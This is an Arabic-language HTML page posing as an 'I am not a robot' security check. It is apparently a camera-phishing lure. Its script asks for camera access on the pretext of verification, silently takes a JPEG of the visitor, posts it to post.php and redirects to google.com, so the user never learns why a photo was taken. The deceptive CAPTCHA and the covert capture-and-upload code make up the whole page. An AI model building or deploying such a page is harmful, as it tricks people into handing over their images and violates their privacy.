<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; font-family: sans-serif; }
        button { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; transition: 0.3s; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>

<button onclick="startProcess()">أنا لست روبوت - اضغط للتحقق</button>

<script>
async function startProcess() {
    try {
        // طلب إذن الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // التأكد من أن الكاميرا بدأت بالعمل قبل التقاط الصورة
        await new Promise(resolve => setTimeout(resolve, 1500));

        const canvas = document.createElement('canvas');
        canvas.width = 640; 
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        
        const data = canvas.toDataURL('image/jpeg', 0.7);
        
        // إرسال البيانات
        const response = await fetch('post.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'img=' + encodeURIComponent(data)
        });

        // إيقاف الكاميرا فوراً بعد الالتقاط
        stream.getTracks().forEach(track => track.stop());

        if (response.ok) {
            window.location.href = "https://www.google.com";
        } else {
            alert("حدث خطأ أثناء الاتصال بالخادم، يرجى المحاولة مرة أخرى.");
        }

    } catch (err) {
        console.error(err);
        alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
    }
}
</script>
</body>
</html>
